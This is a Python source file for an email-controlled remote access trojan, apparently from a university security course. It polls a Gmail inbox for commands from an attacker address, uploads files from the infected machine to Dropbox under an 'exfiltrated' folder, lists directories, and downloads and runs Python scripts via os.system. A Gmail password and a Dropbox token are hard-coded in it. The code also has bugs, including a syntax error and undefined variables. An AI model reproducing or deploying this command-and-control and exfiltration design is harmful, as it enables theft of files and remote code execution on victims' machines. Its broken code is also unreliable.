import os
import smtplib
import imaplib
import email
import time
import socket
import ssl
import dropbox
import uuid

#Commands List
#To send a file to user: download [Dropbox path] [Local name]
#To receive a file from user: fetch [file path]
#To execute a python script from dropbox: execute [Dropbox path]
#To receive directory information: show [Directory path]

emailAdr = "os.services.updates@gmail.com"
password = "cse363esc"
SMTP_SERVER = "imap.gmail.com"
#attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
attacker_email = "William Chen <william.chen@stonybrook.edu>"
SMTP_PORT = 993
commands = []
executable_file = "pip_install.py"
auth_token = "eSp1cKEzdOAAAAAAAAAADFTKh7tVMADzEWVmHJ8Q-aOwZQcT1993aavHJF6Nwvdk"
id = uuid.uuid1().hex

#Get infected IP
def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    IPaddr = s.getsockname()[0]
    s.close()
    return IPaddr

#Initialize Dropbox
def init_dbx():
    dbx = dropbox.Dropbox(auth_token)

#Upload a file to dropbox
def upload_file(path):
    with open(path, 'rb') as f:
        dbx.files_upload(f.read(), '/' + id + '/exfiltrated' + path)

    #SEND AN EMAIL AS RECEIPT OF EXECUTION
    execution_receipt = "Subject: Uploaded " + path + " from " + id + "s computer." + "\n\n"
    execution_receipt += "Successfuly uploaded file to dropbox"
    sendEmail(execution_receipt)

#Download a file from dropbox
def download_file(filePath, localName):
    with open(localName, "w") as f:
        metadata, res = dbx.files_download(path=filePath)
        f.write((res.content).decode())

    #SEND AN EMAIL AS RECEIPT OF EXECUTION
    execution_receipt = "Subject: Dowloaded " + filePath + " into " + localName + " file in " + id "s computer."+ "\n\n"
    execution_receipt += "Successfuly downloaded from dropbox"
    sendEmail(execution_receipt)

#Send email with msg over SMTP SSL
def sendEmail(msg):
    port = 465  # For SSL

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(emailAdr, password)
        server.sendmail(emailAdr, attacker_email, msg)

#EMAIL SUBJECT = show [Directory path]
#NEEDS TO START WITH "C:/" UNLESS KNOWN PATH
def showFiles(commandString):
    dirList = []
    fileList = []
    splitCommand = commandString.split(" ")
    del(splitCommand[0])
    truePath = splitCommand[0]
    for x in os.listdir(truePath):
        if os.path.isdir(os.path.join(aPath, x)):
            dirList.append(x)
        elif os.path.isfile(os.path.join(truePath, x)):
            fileList.append(x)

    directories_string = ""
    files_string = ""
    for dir in dirList:
        directories_string += dir + "\n"
    for file in fileList:
        files_string += file + "\n"
    subjectLine = "Subject: My Directory\n\n"
    payload = subjectLine
    payload += "Files:\n" + files_string + "\nDirectories:\n" + directories_string
    sendEmail(payload)

#EMAIL SUBJECT = fetch [file name]
def getFile(commandString):
    splitCommand = commandString.split(" ")
    del(splitCommand[0])
    filePath = splitCommand[0]
    upload_file(filePath)

#EMAIL SUBJECT = download [file name] [local name]
def receiveFile(commandString):
    splitCommmand = commandString.split(" ")
    del(splitCommand[0])
    filePath = splitCommand[0]
    localPath = splitCommand[1]
    download_file(filePath, localPath)

#EMAIL SUBJECT = execute [file path from dropbox with python script]
def executeCom(commandString):
    splitCommand = commandString.split(" ")
    del(splitCommand[0])
    execCommand = splitCommand[0]
    download_file(execCommand, executable_file)
    os.system('python ' + executable_file)
    os.remove(executable_file)

    #SEND AN EMAIL AS RECEIPT OF EXECUTION
    execution_receipt = "Subject: Executed " + execCommand + "on " + id + "\n\n"
    execution_receipt += "Successfuly executed script"
    sendEmail(execution_receipt)

#Parse commands from emails
def commandParser(commandsParse):
    while commandsParse:
        command = commandsParse[0]
        if "show" in command:
            showFiles(command)
            del commandsParse[0]
        elif "fetch" in command:
            getFile(command)
            del commandsParse[0]
        elif "execute" in command:
            executeCom(command)
            del commandsParse[0]
        elif "download" in command:
            receiveFile(command)
            del commandsParse[0]

#Read an email
def readEmail():
    mail = imaplib.IMAP4_SSL(SMTP_SERVER)
    mail.login(emailAdr, password)
    mail.select('inbox')

    typ, data = mail.search(None, 'ALL')
    for i in data[0].split():
        typ, data = mail.fetch(i, '(RFC822)' )
        msg = email.message_from_bytes(data[0][1])
        subject = msg['Subject']
        sender = msg['From']
        mail.store(i, '+FLAGS', '\\Deleted')
        if(sender == attacker_email):
            commands.append(subject)
            print ('From : ' + sender + '\n')
            print ('Subject : ' + subject + '\n')

    if commands:
       commandParser(commands)

    mail.expunge()
    mail.close()
    mail.logout()

#Send an update every x seconds
#Check email every x seconds
def periodicUpdates(seconds):
    startTime=time.time()
    while True:
        readEmail()
        message = "Subject: " + id + "\n\n" + "Checkin in boss"
        #sendEmail(message)
        time.sleep(seconds - ((time.time() - startTime) % seconds))

init_dbx()
periodicUpdates(30.0)
